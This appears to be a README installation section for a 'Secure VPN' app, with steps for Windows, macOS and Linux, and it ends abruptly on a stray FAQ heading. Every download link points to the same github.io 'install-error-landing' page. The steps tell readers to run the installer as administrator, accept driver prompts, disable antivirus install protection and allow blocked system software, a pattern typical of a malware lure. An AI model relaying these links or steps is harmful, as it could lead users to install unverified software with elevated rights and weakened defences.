## Installation

### Windows
1. Download the installer from the landing page: https://gonbon808.github.io/secure-vpn-install-error-landing/
2. Right-click the installer → **Run as administrator**.
3. If you see a driver prompt, accept it (this is required for the VPN adapter).
4. Reboot if the installer requests it (don’t skip—skipping is a common cause of a secure vpn install error loop).
5. Launch Secure VPN and sign in, then connect.

**If install fails:** temporarily disable third-party AV “install protection” features and retry as admin.

### macOS
1. Download from: https://gonbon808.github.io/secure-vpn-install-error-landing/
2. Open the `.dmg` and drag Secure VPN to **Applications**.
3. On first launch, approve requested **Network** permissions.
4. If macOS blocks the extension:  
   **System Settings → Privacy & Security** → allow the blocked system software, then relaunch.

**If install fails:** remove the app from Applications, reboot, reinstall, then approve prompts in order.

### Linux
1. Download from: https://gonbon808.github.io/secure-vpn-install-error-landing/
2. Install with `sudo` (package depends on distro).
3. Start the service and connect from the app/CLI.

**If install fails:** check you have `sudo` rights and that no other VPN service is locking the network stack.

**Q3: Will the Kill Switch work if the app crashes?**
